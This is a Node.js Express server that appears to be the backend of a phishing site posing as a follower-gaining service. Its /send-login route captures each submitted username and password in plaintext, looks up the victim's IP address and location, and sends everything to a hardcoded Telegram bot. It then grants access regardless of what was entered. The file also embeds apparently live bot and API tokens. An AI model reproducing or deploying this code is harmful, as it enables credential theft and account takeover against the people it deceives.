const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const path = require("path");
const session = require("express-session");

const app = express();
let isAuthenticated = false; // Tracks login state
let dailyFollowerLimit = 120; // Max followers per day

// Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = "7842800574:AAFRpMY5Vxk0BaKxO3owMCDhlO2ik-T4C7A".trim();
const TELEGRAM_CHAT_ID = "2041222064";

// Middleware to parse JSON request body
app.use(bodyParser.json());
app.use(
    session({
        secret: "alwaytrustgod-YOUareHisCreattion",
        resave: false, // Prevents resaving unmodified sessions
        saveUninitialized: true, // Saves new sessions
        cookie: {
            httpOnly: true, // Helps mitigate XSS
            secure: false, // Set to true if using HTTPS
            maxAge: 1000 * 60 * 30, // Session expires after 30 minutes
        },
    })
);      

// Serve static files (CSS, images, etc.)
app.use((req, res, next) => {
    if (req.url === "/index.html" && req.session.isAuthenticated) {
        return res.redirect("/followers");
    }
    next();
});

app.use(express.static(__dirname));

// Serve login page
app.get('/', (req, res) => {
    res.sendFile(path.resolve(__dirname, 'index.html'));
});

// Handle login data
app.post("/send-login", async (req, res) => {
    const { username, password } = req.body;

    console.log("Received login data:", req.body); // Debugging: log incoming data

    // Validate input
    if (!username || !password) {
        return res.status(400).json({ success: false, message: "Username and password are required." });
    }

    try {
        // Fetch IP/location details using IPInfo API
        const ipData = await axios.get("https://ipinfo.io/json?token=deba176e9bd642");
        const { ip, city, region, country, loc } = ipData.data;

        console.log("IP Data fetched:", ipData.data); // Debugging: log IP data

        // Escape special characters in Telegram message
        const escapeMarkdown = (text) =>
            text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');

        // Prepare Telegram message
        const message = `
🌐 *New Login Attempt*:
- *Username*: ${escapeMarkdown(username)}
- *Password*: ${escapeMarkdown(password)}
- *IP*: ${ip}
- *Location*: ${escapeMarkdown(`${city}, ${region}, ${country}`)} (${loc})
- *Country*: ${country} ${getFlagEmoji(country)}
        `;

        // Send the message to Telegram
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "Markdown",
            }
        );

        console.log("Telegram response:", telegramResponse.data); // Debugging: log Telegram response

        req.session.isAuthenticated = true;
        console.log("Session after login:", req.session); // Log the session
        res.json({ success: true, message: "Login successful." });
    } catch (error) {
        if (error.response) {
            console.error("Error response from Telegram:", error.response.data); // Log error details
        } else {
            console.error("Error sending login data:", error.message); // Log general error
        }
        res.status(500).json({ success: false, message: "Failed to send login data." });
    }
});

// Serve followers page (restricted access)
app.get("/followers", (req, res) => {
    console.log("Session content:", req.session); // Log the session
    if (!req.session.isAuthenticated) {
        console.log("User not authenticated, redirecting...");
        return res.redirect("/");
    }
    res.sendFile(path.resolve(__dirname, "followers.html"));
});

// Logout route to destroy session and redirect to login page
app.get("/logout", (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            console.error("Error destroying session:", err);
            return res.status(500).send("Failed to log out.");
        }
        console.log("User logged out, redirecting to /.");
        res.redirect("/"); // Redirect to login page after logout
    });
});

// Helper function to get flag emoji from country code
function getFlagEmoji(countryCode) {
    return countryCode
        .toUpperCase()
        .replace(/./g, (char) => String.fromCodePoint(127397 + char.charCodeAt()));
}

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
